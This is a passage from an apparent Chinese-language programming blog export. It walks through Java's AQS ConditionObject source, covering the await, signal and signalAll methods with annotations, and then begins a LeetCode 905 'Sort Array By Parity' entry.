node)</span> </span>&#123;</span><br><span class="line">       <span class="keyword">boolean</span> failed = <span class="keyword">true</span>;</span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           <span class="keyword">int</span> savedState = getState();</span><br><span class="line">           <span class="keyword">if</span> (release(savedState)) &#123;</span><br><span class="line">               failed = <span class="keyword">false</span>;</span><br><span class="line">               <span class="keyword">return</span> savedState;</span><br><span class="line">           &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">               <span class="keyword">throw</span> <span class="keyword">new</span> IllegalMonitorStateException();</span><br><span class="line">           &#125;</span><br><span class="line">       &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">           <span class="keyword">if</span> (failed)</span><br><span class="line">               node.waitStatus = Node.CANCELLED;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<h4 id="isOnSyncQueue"><a href="#isOnSyncQueue" class="headerlink" title="isOnSyncQueue"></a>isOnSyncQueue</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">    * Returns true if a node, always one that was initially placed on</span></span><br><span class="line"><span class="comment">    * a condition queue, is now waiting to reacquire on sync queue.</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@param</span> node the node</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@return</span> true if is reacquiring</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">   <span class="function"><span class="keyword">final</span> <span class="keyword">boolean</span> <span class="title">isOnSyncQueue</span><span class="params">(Node node)</span> </span>&#123;</span><br><span class="line">       <span class="comment">// 转移到AQS同步队列的节点状态为都会设置为初始状态（值为0）</span></span><br><span class="line">       <span class="keyword">if</span> (node.waitStatus == Node.CONDITION || node.prev == <span class="keyword">null</span>)</span><br><span class="line">           <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">       <span class="comment">// 当节点是AQS同步队列的中间节点时（在同步队列中含有next节点）则返回true</span></span><br><span class="line">       <span class="keyword">if</span> (node.next != <span class="keyword">null</span>) <span class="comment">// If has successor, it must be on queue</span></span><br><span class="line">           <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">       <span class="comment">/*</span></span><br><span class="line"><span class="comment">        * node.prev can be non-null, but not yet on queue because</span></span><br><span class="line"><span class="comment">        * the CAS to place it on queue can fail. So we have to</span></span><br><span class="line"><span class="comment">        * traverse from tail to make sure it actually made it.  It</span></span><br><span class="line"><span class="comment">        * will always be near the tail in calls to this method, and</span></span><br><span class="line"><span class="comment">        * unless the CAS failed (which is unlikely), it will be</span></span><br><span class="line"><span class="comment">        * there, so we hardly ever traverse much.</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">       <span class="keyword">return</span> findNodeFromTail(node);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<h4 id="整体流程"><a href="#整体流程" class="headerlink" title="整体流程"></a>整体流程</h4><ol>
<li><p>将当前线程封装为Node节点并加入到条件等待队列中；</p>
</li>
<li><p>释放锁，如果释放锁成功，则调用unparkSuccessor方法唤醒该节点在AQS的FIFO队列中的后继节点；</p>
</li>
<li><p>while死循环判断是否已经在AQS的FIFO队列中了（其他线程调用signal或者signalAll方法时，会触发这个节点被转移到FIFO队列的动作）；</p>
<ul>
<li>如果没有在FIFO队列中，则park当前线程，等待唤醒；</li>
<li>同时通过方法checkInterruptWhileWaiting判断线程是否在等待的过程中发生了中断，赋值interruptMode中断便签</li>
</ul>
</li>
<li><p>关于中断模式： 1) 当在被通知前被中断则将中断模式设置为THROW_IE； 2) 当在被通知后则将中断模式设置为REINTERRUPT(因为acquireQueued不会响应中断)。</p>
</li>
<li><p>删除取消的后继等待节点。</p>
</li>
<li><p>根据中断模式抛出异常。</p>
</li>
</ol>
<h3 id="awaitUninterruptibly方法"><a href="#awaitUninterruptibly方法" class="headerlink" title="awaitUninterruptibly方法"></a>awaitUninterruptibly方法</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 如果在死循环的过程中，线程被中断了，忽略</span></span><br><span class="line"><span class="comment">       * Implements uninterruptible condition wait.</span></span><br><span class="line"><span class="comment">       * &lt;ol&gt;</span></span><br><span class="line"><span class="comment">       * &lt;li&gt; Save lock state returned by &#123;<span class="doctag">@link</span> #getState&#125;.</span></span><br><span class="line"><span class="comment">       * &lt;li&gt; Invoke &#123;<span class="doctag">@link</span> #release&#125; with saved state as argument,</span></span><br><span class="line"><span class="comment">       *      throwing IllegalMonitorStateException if it fails.</span></span><br><span class="line"><span class="comment">       * &lt;li&gt; Block until signalled.</span></span><br><span class="line"><span class="comment">       * &lt;li&gt; Reacquire by invoking specialized version of</span></span><br><span class="line"><span class="comment">       *      &#123;<span class="doctag">@link</span> #acquire&#125; with saved state as argument.</span></span><br><span class="line"><span class="comment">       * &lt;/ol&gt;</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line">      <span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title">awaitUninterruptibly</span><span class="params">()</span> </span>&#123;</span><br><span class="line">          Node node = addConditionWaiter();</span><br><span class="line">          <span class="keyword">int</span> savedState = fullyRelease(node);</span><br><span class="line">          <span class="keyword">boolean</span> interrupted = <span class="keyword">false</span>;</span><br><span class="line">          <span class="keyword">while</span> (!isOnSyncQueue(node)) &#123;</span><br><span class="line">              LockSupport.park(<span class="keyword">this</span>);</span><br><span class="line">              <span class="keyword">if</span> (Thread.interrupted())</span><br><span class="line">                  interrupted = <span class="keyword">true</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">if</span> (acquireQueued(node, savedState) || interrupted)</span><br><span class="line">              selfInterrupt();</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure>



<h3 id="awaitNanos方法"><a href="#awaitNanos方法" class="headerlink" title="awaitNanos方法"></a>awaitNanos方法</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 和await方法类似，增加了超时时间</span></span><br><span class="line"><span class="comment"> * 超时了之后，直接将当前节点转入AQS的FIFO队列</span></span><br><span class="line"><span class="comment">       * Implements timed condition wait.</span></span><br><span class="line"><span class="comment">       * &lt;ol&gt;</span></span><br><span class="line"><span class="comment">       * &lt;li&gt; If current thread is interrupted, throw InterruptedException.</span></span><br><span class="line"><span class="comment">       * &lt;li&gt; Save lock state returned by &#123;<span class="doctag">@link</span> #getState&#125;.</span></span><br><span class="line"><span class="comment">       * &lt;li&gt; Invoke &#123;<span class="doctag">@link</span> #release&#125; with saved state as argument,</span></span><br><span class="line"><span class="comment">       *      throwing IllegalMonitorStateException if it fails.</span></span><br><span class="line"><span class="comment">       * &lt;li&gt; Block until signalled, interrupted, or timed out.</span></span><br><span class="line"><span class="comment">       * &lt;li&gt; Reacquire by invoking specialized version of</span></span><br><span class="line"><span class="comment">       *      &#123;<span class="doctag">@link</span> #acquire&#125; with saved state as argument.</span></span><br><span class="line"><span class="comment">       * &lt;li&gt; If interrupted while blocked in step 4, throw InterruptedException.</span></span><br><span class="line"><span class="comment">       * &lt;/ol&gt;</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line">      <span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">long</span> <span class="title">awaitNanos</span><span class="params">(<span class="keyword">long</span> nanosTimeout)</span></span></span><br><span class="line"><span class="function">              <span class="keyword">throws</span> InterruptedException </span>&#123;</span><br><span class="line">          <span class="keyword">if</span> (Thread.interrupted())</span><br><span class="line">              <span class="keyword">throw</span> <span class="keyword">new</span> InterruptedException();</span><br><span class="line">          Node node = addConditionWaiter();</span><br><span class="line">          <span class="keyword">int</span> savedState = fullyRelease(node);</span><br><span class="line">          <span class="keyword">final</span> <span class="keyword">long</span> deadline = System.nanoTime() + nanosTimeout;</span><br><span class="line">          <span class="keyword">int</span> interruptMode = <span class="number">0</span>;</span><br><span class="line">          <span class="keyword">while</span> (!isOnSyncQueue(node)) &#123;</span><br><span class="line">              <span class="keyword">if</span> (nanosTimeout &lt;= <span class="number">0L</span>) &#123;</span><br><span class="line">                  transferAfterCancelledWait(node);</span><br><span class="line">                  <span class="keyword">break</span>;</span><br><span class="line">              &#125;</span><br><span class="line">              <span class="keyword">if</span> (nanosTimeout &gt;= spinForTimeoutThreshold)</span><br><span class="line">                  LockSupport.parkNanos(<span class="keyword">this</span>, nanosTimeout);</span><br><span class="line">              <span class="keyword">if</span> ((interruptMode = checkInterruptWhileWaiting(node)) != <span class="number">0</span>)</span><br><span class="line">                  <span class="keyword">break</span>;</span><br><span class="line">              nanosTimeout = deadline - System.nanoTime();</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">if</span> (acquireQueued(node, savedState) &amp;&amp; interruptMode != THROW_IE)</span><br><span class="line">              interruptMode = REINTERRUPT;</span><br><span class="line">          <span class="keyword">if</span> (node.nextWaiter != <span class="keyword">null</span>)</span><br><span class="line">              unlinkCancelledWaiters();</span><br><span class="line">          <span class="keyword">if</span> (interruptMode != <span class="number">0</span>)</span><br><span class="line">              reportInterruptAfterWait(interruptMode);</span><br><span class="line">          <span class="keyword">return</span> deadline - System.nanoTime();</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure>

<h4 id="transferAfterCancelledWait方法"><a href="#transferAfterCancelledWait方法" class="headerlink" title="transferAfterCancelledWait方法"></a>transferAfterCancelledWait方法</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">    * Transfers node, if necessary, to sync queue after a cancelled wait.</span></span><br><span class="line"><span class="comment">    * Returns true if thread was cancelled before being signalled.</span></span><br><span class="line"><span class="comment">    *</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@param</span> node the node</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@return</span> true if cancelled before the node was signalled</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">   <span class="function"><span class="keyword">final</span> <span class="keyword">boolean</span> <span class="title">transferAfterCancelledWait</span><span class="params">(Node node)</span> </span>&#123;</span><br><span class="line">       <span class="keyword">if</span> (compareAndSetWaitStatus(node, Node.CONDITION, <span class="number">0</span>)) &#123;</span><br><span class="line">           enq(node);</span><br><span class="line">           <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="comment">/*</span></span><br><span class="line"><span class="comment">        * If we lost out to a signal(), then we can't proceed</span></span><br><span class="line"><span class="comment">        * until it finishes its enq().  Cancelling during an</span></span><br><span class="line"><span class="comment">        * incomplete transfer is both rare and transient, so just</span></span><br><span class="line"><span class="comment">        * spin.</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">       <span class="keyword">while</span> (!isOnSyncQueue(node))</span><br><span class="line">           Thread.yield();</span><br><span class="line">       <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<h3 id="awaitUntil方法"><a href="#awaitUntil方法" class="headerlink" title="awaitUntil方法"></a>awaitUntil方法</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 在截止时间之前如果没有被唤醒的话则强制将当前的Node加入到AQS的FIFO队列</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment">       * Implements absolute timed condition wait.</span></span><br><span class="line"><span class="comment">       * &lt;ol&gt;</span></span><br><span class="line"><span class="comment">       * &lt;li&gt; If current thread is interrupted, throw InterruptedException.</span></span><br><span class="line"><span class="comment">       * &lt;li&gt; Save lock state returned by &#123;<span class="doctag">@link</span> #getState&#125;.</span></span><br><span class="line"><span class="comment">       * &lt;li&gt; Invoke &#123;<span class="doctag">@link</span> #release&#125; with saved state as argument,</span></span><br><span class="line"><span class="comment">       *      throwing IllegalMonitorStateException if it fails.</span></span><br><span class="line"><span class="comment">       * &lt;li&gt; Block until signalled, interrupted, or timed out.</span></span><br><span class="line"><span class="comment">       * &lt;li&gt; Reacquire by invoking specialized version of</span></span><br><span class="line"><span class="comment">       *      &#123;<span class="doctag">@link</span> #acquire&#125; with saved state as argument.</span></span><br><span class="line"><span class="comment">       * &lt;li&gt; If interrupted while blocked in step 4, throw InterruptedException.</span></span><br><span class="line"><span class="comment">       * &lt;li&gt; If timed out while blocked in step 4, return false, else true.</span></span><br><span class="line"><span class="comment">       * &lt;/ol&gt;</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line">      <span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">boolean</span> <span class="title">awaitUntil</span><span class="params">(Date deadline)</span></span></span><br><span class="line"><span class="function">              <span class="keyword">throws</span> InterruptedException </span>&#123;</span><br><span class="line">          <span class="keyword">long</span> abstime = deadline.getTime();</span><br><span class="line">          <span class="keyword">if</span> (Thread.interrupted())</span><br><span class="line">              <span class="keyword">throw</span> <span class="keyword">new</span> InterruptedException();</span><br><span class="line">          Node node = addConditionWaiter();</span><br><span class="line">          <span class="keyword">int</span> savedState = fullyRelease(node);</span><br><span class="line">          <span class="keyword">boolean</span> timedout = <span class="keyword">false</span>;</span><br><span class="line">          <span class="keyword">int</span> interruptMode = <span class="number">0</span>;</span><br><span class="line">          <span class="keyword">while</span> (!isOnSyncQueue(node)) &#123;</span><br><span class="line">              <span class="keyword">if</span> (System.currentTimeMillis() &gt; abstime) &#123;</span><br><span class="line">                  timedout = transferAfterCancelledWait(node);</span><br><span class="line">                  <span class="keyword">break</span>;</span><br><span class="line">              &#125;</span><br><span class="line">              LockSupport.parkUntil(<span class="keyword">this</span>, abstime);</span><br><span class="line">              <span class="keyword">if</span> ((interruptMode = checkInterruptWhileWaiting(node)) != <span class="number">0</span>)</span><br><span class="line">                  <span class="keyword">break</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">if</span> (acquireQueued(node, savedState) &amp;&amp; interruptMode != THROW_IE)</span><br><span class="line">              interruptMode = REINTERRUPT;</span><br><span class="line">          <span class="keyword">if</span> (node.nextWaiter != <span class="keyword">null</span>)</span><br><span class="line">              unlinkCancelledWaiters();</span><br><span class="line">          <span class="keyword">if</span> (interruptMode != <span class="number">0</span>)</span><br><span class="line">              reportInterruptAfterWait(interruptMode);</span><br><span class="line">          <span class="keyword">return</span> !timedout;</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure>

<h3 id="await-long-time-TimeUnit-unit-方法"><a href="#await-long-time-TimeUnit-unit-方法" class="headerlink" title="await(long time, TimeUnit unit)方法"></a>await(long time, TimeUnit unit)方法</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 和await方法类似，超时就移入AQS的FIFO队列</span></span><br><span class="line"><span class="comment">       * Implements timed condition wait.</span></span><br><span class="line"><span class="comment">       * &lt;ol&gt;</span></span><br><span class="line"><span class="comment">       * &lt;li&gt; If current thread is interrupted, throw InterruptedException.</span></span><br><span class="line"><span class="comment">       * &lt;li&gt; Save lock state returned by &#123;<span class="doctag">@link</span> #getState&#125;.</span></span><br><span class="line"><span class="comment">       * &lt;li&gt; Invoke &#123;<span class="doctag">@link</span> #release&#125; with saved state as argument,</span></span><br><span class="line"><span class="comment">       *      throwing IllegalMonitorStateException if it fails.</span></span><br><span class="line"><span class="comment">       * &lt;li&gt; Block until signalled, interrupted, or timed out.</span></span><br><span class="line"><span class="comment">       * &lt;li&gt; Reacquire by invoking specialized version of</span></span><br><span class="line"><span class="comment">       *      &#123;<span class="doctag">@link</span> #acquire&#125; with saved state as argument.</span></span><br><span class="line"><span class="comment">       * &lt;li&gt; If interrupted while blocked in step 4, throw InterruptedException.</span></span><br><span class="line"><span class="comment">       * &lt;li&gt; If timed out while blocked in step 4, return false, else true.</span></span><br><span class="line"><span class="comment">       * &lt;/ol&gt;</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line">      <span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">boolean</span> <span class="title">await</span><span class="params">(<span class="keyword">long</span> time, TimeUnit unit)</span></span></span><br><span class="line"><span class="function">              <span class="keyword">throws</span> InterruptedException </span>&#123;</span><br><span class="line">          <span class="keyword">long</span> nanosTimeout = unit.toNanos(time);</span><br><span class="line">          <span class="keyword">if</span> (Thread.interrupted())</span><br><span class="line">              <span class="keyword">throw</span> <span class="keyword">new</span> InterruptedException();</span><br><span class="line">          Node node = addConditionWaiter();</span><br><span class="line">          <span class="keyword">int</span> savedState = fullyRelease(node);</span><br><span class="line">          <span class="keyword">final</span> <span class="keyword">long</span> deadline = System.nanoTime() + nanosTimeout;</span><br><span class="line">          <span class="keyword">boolean</span> timedout = <span class="keyword">false</span>;</span><br><span class="line">          <span class="keyword">int</span> interruptMode = <span class="number">0</span>;</span><br><span class="line">          <span class="keyword">while</span> (!isOnSyncQueue(node)) &#123;</span><br><span class="line">              <span class="keyword">if</span> (nanosTimeout &lt;= <span class="number">0L</span>) &#123;</span><br><span class="line">                  timedout = transferAfterCancelledWait(node);</span><br><span class="line">                  <span class="keyword">break</span>;</span><br><span class="line">              &#125;</span><br><span class="line">              <span class="keyword">if</span> (nanosTimeout &gt;= spinForTimeoutThreshold)</span><br><span class="line">                  LockSupport.parkNanos(<span class="keyword">this</span>, nanosTimeout);</span><br><span class="line">              <span class="keyword">if</span> ((interruptMode = checkInterruptWhileWaiting(node)) != <span class="number">0</span>)</span><br><span class="line">                  <span class="keyword">break</span>;</span><br><span class="line">              nanosTimeout = deadline - System.nanoTime();</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">if</span> (acquireQueued(node, savedState) &amp;&amp; interruptMode != THROW_IE)</span><br><span class="line">              interruptMode = REINTERRUPT;</span><br><span class="line">          <span class="keyword">if</span> (node.nextWaiter != <span class="keyword">null</span>)</span><br><span class="line">              unlinkCancelledWaiters();</span><br><span class="line">          <span class="keyword">if</span> (interruptMode != <span class="number">0</span>)</span><br><span class="line">              reportInterruptAfterWait(interruptMode);</span><br><span class="line">          <span class="keyword">return</span> !timedout;</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure>

<h3 id="signal方法"><a href="#signal方法" class="headerlink" title="signal方法"></a>signal方法</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/** 将等待时间最长的节点，也就是首节点移入AQS的FIFO队列去竞争锁</span></span><br><span class="line"><span class="comment"> * 当前线程需要获取锁</span></span><br><span class="line"><span class="comment">       * Moves the longest-waiting thread, if one exists, from the</span></span><br><span class="line"><span class="comment">       * wait queue for this condition to the wait queue for the</span></span><br><span class="line"><span class="comment">       * owning lock.</span></span><br><span class="line"><span class="comment">       *</span></span><br><span class="line"><span class="comment">       * <span class="doctag">@throws</span> IllegalMonitorStateException if &#123;<span class="doctag">@link</span> #isHeldExclusively&#125;</span></span><br><span class="line"><span class="comment">       *         returns &#123;<span class="doctag">@code</span> false&#125;</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line">      <span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title">signal</span><span class="params">()</span> </span>&#123;</span><br><span class="line">          <span class="comment">// 是否独占锁</span></span><br><span class="line">          <span class="keyword">if</span> (!isHeldExclusively())</span><br><span class="line">              <span class="keyword">throw</span> <span class="keyword">new</span> IllegalMonitorStateException();</span><br><span class="line">          Node first = firstWaiter;</span><br><span class="line">          <span class="keyword">if</span> (first != <span class="keyword">null</span>)</span><br><span class="line">              doSignal(first);</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure>

<h4 id="doSignal方法"><a href="#doSignal方法" class="headerlink" title="doSignal方法"></a>doSignal方法</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/** 将Condition队列中第一个非cancalled状态的节点从队列中移除，并移入AQS的FIFO队列中</span></span><br><span class="line"><span class="comment">       * Removes and transfers nodes until hit non-cancelled one or</span></span><br><span class="line"><span class="comment">       * null. Split out from signal in part to encourage compilers</span></span><br><span class="line"><span class="comment">       * to inline the case of no waiters.</span></span><br><span class="line"><span class="comment">       * <span class="doctag">@param</span> first (non-null) the first node on condition queue</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line">      <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">doSignal</span><span class="params">(Node first)</span> </span>&#123;</span><br><span class="line">          <span class="keyword">do</span> &#123;</span><br><span class="line">              <span class="keyword">if</span> ( (firstWaiter = first.nextWaiter) == <span class="keyword">null</span>)</span><br><span class="line">                  lastWaiter = <span class="keyword">null</span>;</span><br><span class="line">              first.nextWaiter = <span class="keyword">null</span>;</span><br><span class="line">          &#125; <span class="keyword">while</span> (!transferForSignal(first) &amp;&amp;</span><br><span class="line">                   (first = firstWaiter) != <span class="keyword">null</span>);</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure>

<h4 id="transferForSignal方法"><a href="#transferForSignal方法" class="headerlink" title="transferForSignal方法"></a><em>transferForSignal</em>方法</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 将Condition队列中的节点移入AQS的FIFO队列。成功返回true</span></span><br><span class="line"><span class="comment"> * 首先enq将该node添加到CLH队列中</span></span><br><span class="line"><span class="comment"> * 其次若CLH队列原先尾节点为CANCELLED或者对原先尾节点CAS设置成SIGNAL失败</span></span><br><span class="line"><span class="comment"> * 则唤醒node节点；否则该节点在CLH队列总前驱节点已经是signal状态了，唤醒工作交给前驱节点</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment">    * Transfers a node from a condition queue onto sync queue.</span></span><br><span class="line"><span class="comment">    * Returns true if successful.</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@param</span> node the node</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@return</span> true if successfully transferred (else the node was</span></span><br><span class="line"><span class="comment">    * cancelled before signal)</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">   <span class="function"><span class="keyword">final</span> <span class="keyword">boolean</span> <span class="title">transferForSignal</span><span class="params">(Node node)</span> </span>&#123;</span><br><span class="line">       <span class="comment">/*</span></span><br><span class="line"><span class="comment">        * If cannot change waitStatus, the node has been cancelled.</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">       <span class="keyword">if</span> (!compareAndSetWaitStatus(node, Node.CONDITION, <span class="number">0</span>))</span><br><span class="line">           <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">       <span class="comment">/*</span></span><br><span class="line"><span class="comment">        * Splice onto queue and try to set waitStatus of predecessor to</span></span><br><span class="line"><span class="comment">        * indicate that thread is (probably) waiting. If cancelled or</span></span><br><span class="line"><span class="comment">        * attempt to set waitStatus fails, wake up to resync (in which</span></span><br><span class="line"><span class="comment">        * case the waitStatus can be transiently and harmlessly wrong).</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">       Node p = enq(node);</span><br><span class="line">       <span class="keyword">int</span> ws = p.waitStatus;</span><br><span class="line">       <span class="keyword">if</span> (ws &gt; <span class="number">0</span> || !compareAndSetWaitStatus(p, ws, Node.SIGNAL))</span><br><span class="line">           LockSupport.unpark(node.thread);</span><br><span class="line">       <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<h3 id="signalAll方法"><a href="#signalAll方法" class="headerlink" title="signalAll方法"></a>signalAll方法</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 将CONDITION队列中所有node出队，逐个添加到FIFO队列末尾</span></span><br><span class="line"><span class="comment">       * Moves all threads from the wait queue for this condition to</span></span><br><span class="line"><span class="comment">       * the wait queue for the owning lock.</span></span><br><span class="line"><span class="comment">       *</span></span><br><span class="line"><span class="comment">       * <span class="doctag">@throws</span> IllegalMonitorStateException if &#123;<span class="doctag">@link</span> #isHeldExclusively&#125;</span></span><br><span class="line"><span class="comment">       *         returns &#123;<span class="doctag">@code</span> false&#125;</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line">      <span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title">signalAll</span><span class="params">()</span> </span>&#123;</span><br><span class="line">          <span class="keyword">if</span> (!isHeldExclusively())</span><br><span class="line">              <span class="keyword">throw</span> <span class="keyword">new</span> IllegalMonitorStateException();</span><br><span class="line">          Node first = firstWaiter;</span><br><span class="line">          <span class="keyword">if</span> (first != <span class="keyword">null</span>)</span><br><span class="line">              doSignalAll(first);</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure>

<h4 id="doSignalAll方法"><a href="#doSignalAll方法" class="headerlink" title="doSignalAll方法"></a>doSignalAll方法</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">       * Removes and transfers all nodes.</span></span><br><span class="line"><span class="comment">       * <span class="doctag">@param</span> first (non-null) the first node on condition queue</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line">      <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">doSignalAll</span><span class="params">(Node first)</span> </span>&#123;</span><br><span class="line">          lastWaiter = firstWaiter = <span class="keyword">null</span>;</span><br><span class="line">          <span class="keyword">do</span> &#123;</span><br><span class="line">              Node next = first.nextWaiter;</span><br><span class="line">              first.nextWaiter = <span class="keyword">null</span>;</span><br><span class="line">              transferForSignal(first);</span><br><span class="line">              first = next;</span><br><span class="line">          &#125; <span class="keyword">while</span> (first != <span class="keyword">null</span>);</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure>

<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ol>
<li>每一个创建的ConditionObject都维持这各自的一个单向的等待队列，但是同一个Lock的所有ConditionObject都共享一个AQS的FIFO同步队列；</li>
<li>当调用await方法时释放锁并进入阻塞状态，调用signal方法将条件等待队列中的首节点线程移动到AQS同步队列中并将其前继节点设置为SIGNAL或者直接唤醒线程使得被通知的线程能去获取锁；</li>
<li><strong>调用await方法释放锁并将线程添加到条件等待队列中并没有采用死循环CAS设置（参考AQS.enq方法）</strong>，因为Condition对象<strong>只能用于独占模式</strong>，而且在调用await之前会显示的获取独占锁，否则会<strong>抛出非法监视器状态异常。</strong></li>
<li><strong>调用signal方法将转移等待节点，也不需要CAS来保证</strong>，因为<strong>signal会确保调用者caller是获取独占锁的线程</strong>（通过<strong>isHeldExclusively方法来判断</strong>，如果为false会<strong>抛出非法监视器状态的异常</strong>）。</li>
</ol>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><a href="https://zhuanlan.zhihu.com/p/38011904" target="_blank" rel="noopener">Java并发编程-Lock和Condition</a></p>
<p><a href="https://www.jianshu.com/p/4d4c7398e187" target="_blank" rel="noopener">AQS的ConditionObject源码详解</a></p>
<p><a href="https://blog.csdn.net/u011470552/article/details/76571472" target="_blank" rel="noopener">jdk1.8 J.U.C并发源码阅读——AQS之conditionObject内部类分析</a></p>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>锁</tag>
        <tag>并发</tag>
        <tag>多线程</tag>
        <tag>Lock</tag>
        <tag>Condition</tag>
      </tags>
  </entry>
  <entry>
    <title>905. Sort Array By Parity</title>
    <url>/2020/03/18/LeetCode/leetcode-000905.Sort%20Array%20By%20Parity/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>Given an array <code>A</code> of non-negative integers, return an array consisting of all the even elements of <code>A</code>, followed by all the odd elements of <code>A</code>.</p>
<p>You may return any answer array that satisfies this condition.</p>
<h3 id="Example-1"><a href="#Example-1" class="headerlink" title="Example 1:"></a>Example 1:</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Input: [3,1,2,4]</span><br><span class="line">Output: [2,4,3,1]</span><br><span class="line">The outputs [4,2,3,1], [2,4,1,3], and [4,2,1,3] would also be accepted.</span><br></pre></td></tr></table></figure>

<h3 id="Note"><a href="#Note" class="headerlink" title="Note:"></a><strong>Note:</strong></h3><ol>
<li><code>1 &lt;= A.length &lt;= 5000</code></li>
<li><code>0 &lt;= A[i] &lt;= 5000</code></li>
</ol>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>遍历一次，用两个位置索引，初始化为0，和数组长度减1。分别判断它们对应位子上的数，是奇数还是偶数。如果前一个位置是奇数，后一个是偶数，则对应位置的数互换，否则前一个位置的索引自增，后一个位置的索引自减，直到双方相遇为止。</p>
